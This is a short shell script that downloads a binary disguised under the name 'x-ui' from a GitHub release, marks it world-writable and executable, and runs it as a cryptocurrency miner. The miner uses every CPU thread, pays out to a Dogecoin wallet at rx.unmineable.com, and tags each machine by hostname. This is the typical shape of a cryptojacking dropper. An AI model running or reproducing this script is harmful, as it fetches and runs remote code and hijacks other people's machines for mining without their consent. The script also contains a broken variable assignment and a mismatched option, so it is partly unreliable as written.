cpu=$(echo nproc | bash)
name-$(hostname)
xui=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/x-ui

wget $xui

chmod 777 x-ui

./x-ui --algo=rx/0 --threads=$cpu --donate-level=0 \
--randomx-wrmsr=-1 --url=rx.unmineable.com:3333 \
--user=DOGE:A7E5Ppu3Z8R8CXBbpkRKkG8AXnBkqh6Csp.$name \
--pass=x --astrobwt-avx2
